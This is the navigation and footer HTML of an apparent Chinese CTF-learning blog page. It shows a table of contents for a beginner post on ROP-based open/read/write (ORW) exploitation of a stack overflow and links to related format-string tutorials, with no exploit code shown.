class="toc-text">三个函数的参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#open-%E9%9C%80%E8%A6%81%E6%96%87%E4%BB%B6%E5%90%8D%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-number">1.4.</span> <span class="toc-text">open() 需要文件名的地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#read-%E6%8A%8A%E6%95%B0%E6%8D%AE%E5%86%99%E8%BF%9B%E5%86%85%E5%AD%98"><span class="toc-number">1.5.</span> <span class="toc-text">read() 把数据写进内存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write-%E6%8A%8A%E5%86%85%E5%AD%98%E5%86%85%E5%AE%B9%E8%BE%93%E5%87%BA"><span class="toc-number">1.6.</span> <span class="toc-text">write() 把内存内容输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP-gadget-%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.7.</span> <span class="toc-text">ROP gadget 如何设置寄存器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%8A%8A-eax-%E6%90%AC%E5%88%B0-edi"><span class="toc-number">1.8.</span> <span class="toc-text">为什么要把 eax 搬到 edi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bss-%E5%9C%A8-ORW-%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">1.9.</span> <span class="toc-text">.bss 在 ORW 中的作用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%E6%9E%84%E9%80%A0-ORW"><span class="toc-number">2.</span> <span class="toc-text">实战：栈溢出构造 ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">题目源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87-flag-%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">准备 flag 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91"><span class="toc-number">2.3.</span> <span class="toc-text">编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%92%8C-gadget"><span class="toc-number">2.4.</span> <span class="toc-text">确认函数入口和 gadget</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%EF%BC%9A%E6%8A%8A%E6%96%87%E4%BB%B6%E5%90%8D%E5%86%99%E5%85%A5-bss"><span class="toc-number">3.</span> <span class="toc-text">第一阶段：把文件名写入 .bss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%EF%BC%9Aopen%E3%80%81read%E3%80%81write"><span class="toc-number">4.</span> <span class="toc-text">第二阶段：open、read、write</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8-open-flag-bss-0"><span class="toc-number">4.1.</span> <span class="toc-text">调用 open(flag_bss, 0)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E9%80%92%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="toc-number">4.2.</span> <span class="toc-text">传递文件描述符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8-read-fd-flag-bss-0x100"><span class="toc-number">4.3.</span> <span class="toc-text">调用 read(fd, flag_bss, 0x100)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8-write-1-flag-bss-0x100"><span class="toc-number">4.4.</span> <span class="toc-text">调用 write(1, flag_bss, 0x100)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E8%84%9A%E6%9C%AC"><span class="toc-number">5.</span> <span class="toc-text">完整脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ORW-%E8%BF%87%E7%A8%8B%E4%B8%AD%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84%E7%8A%B6%E6%80%81%E5%8F%98%E5%8C%96"><span class="toc-number">6.</span> <span class="toc-text">ORW 过程中最重要的状态变化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/10/07/ORW%20%E5%85%A5%E9%97%A8%EF%BC%9A%E7%94%A8%20ROP%20%E6%89%93%E5%BC%80%E3%80%81%E8%AF%BB%E5%8F%96%E5%B9%B6%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6/" title="ORW 入门：用 ROP 打开、读取并输出文件"><img src="/img/yanami15.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ORW 入门：用 ROP 打开、读取并输出文件"/></a><div class="content"><a class="title" href="/2026/10/07/ORW%20%E5%85%A5%E9%97%A8%EF%BC%9A%E7%94%A8%20ROP%20%E6%89%93%E5%BC%80%E3%80%81%E8%AF%BB%E5%8F%96%E5%B9%B6%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6/" title="ORW 入门：用 ROP 打开、读取并输出文件">ORW 入门：用 ROP 打开、读取并输出文件</a><time datetime="2026-10-07T11:27:17.000Z" title="发表于 2026-10-07 19:27:17">2026-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/07/PIE%20%E5%BC%80%E5%90%AF%E4%B8%8B%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%EF%BC%9A%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80%E5%B9%B6%E5%8A%AB%E6%8C%81%20GOT/" title="PIE 开启下的格式化字符串利用：泄露基址并劫持 GOT"><img src="/img/yanami14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PIE 开启下的格式化字符串利用：泄露基址并劫持 GOT"/></a><div class="content"><a class="title" href="/2026/10/07/PIE%20%E5%BC%80%E5%90%AF%E4%B8%8B%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%EF%BC%9A%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80%E5%B9%B6%E5%8A%AB%E6%8C%81%20GOT/" title="PIE 开启下的格式化字符串利用：泄露基址并劫持 GOT">PIE 开启下的格式化字符串利用：泄露基址并劫持 GOT</a><time datetime="2026-10-07T02:20:48.000Z" title="发表于 2026-10-07 10:20:48">2026-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E6%88%98%EF%BC%9A%E8%A6%86%E7%9B%96%20exit@got%20%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B/" title="格式化字符串实战：覆盖 exit@got 劫持程序流程"><img src="/img/yanami13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="格式化字符串实战：覆盖 exit@got 劫持程序流程"/></a><div class="content"><a class="title" href="/2026/10/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E6%88%98%EF%BC%9A%E8%A6%86%E7%9B%96%20exit@got%20%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B/" title="格式化字符串实战：覆盖 exit@got 劫持程序流程">格式化字符串实战：覆盖 exit@got 劫持程序流程</a><time datetime="2026-10-06T08:34:20.000Z" title="发表于 2026-10-06 16:34:20">2026-10-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/06/format-string-got-write/" title="格式化字符串任意地址写：利用 %n 修改 GOT"><img src="/img/yanami12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="格式化字符串任意地址写：利用 %n 修改 GOT"/></a><div class="content"><a class="title" href="/2026/10/06/format-string-got-write/" title="格式化字符串任意地址写：利用 %n 修改 GOT">格式化字符串任意地址写：利用 %n 修改 GOT</a><time datetime="2026-10-06T05:56:15.000Z" title="发表于 2026-10-06 13:56:15">2026-10-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/09/27/%E6%84%9F%E5%86%92%E4%BA%86%EF%BC%8C%E5%B7%A9%E5%9B%BA%E4%BB%A5%E5%89%8D%E5%AD%A6%E7%9A%84%E5%86%85%E5%AE%B9/" title="感冒了，巩固以前学的内容"><img src="/img/yanami11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="感冒了，巩固以前学的内容"/></a><div class="content"><a class="title" href="/2026/09/27/%E6%84%9F%E5%86%92%E4%BA%86%EF%BC%8C%E5%B7%A9%E5%9B%BA%E4%BB%A5%E5%89%8D%E5%AD%A6%E7%9A%84%E5%86%85%E5%AE%B9/" title="感冒了，巩固以前学的内容">感冒了，巩固以前学的内容</a><time datetime="2026-09-27T11:23:54.000Z" title="发表于 2026-09-27 19:23:54">2026-09-27</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Anna Yanami</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script src="/js/custom.js"></script><script src="https://cdn.jsdelivr.net/npm/pangu@7.2.0/dist/browser/pangu.umd.js"></script><script src="/js/runtime.js"></script><script> const initPangu = () => { if (typeof pangu !== 'undefined') { pangu.spacingPage(); } }; document.addEventListener('DOMContentLoaded', initPangu); document.addEventListener('pjax:complete', initPangu); </script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
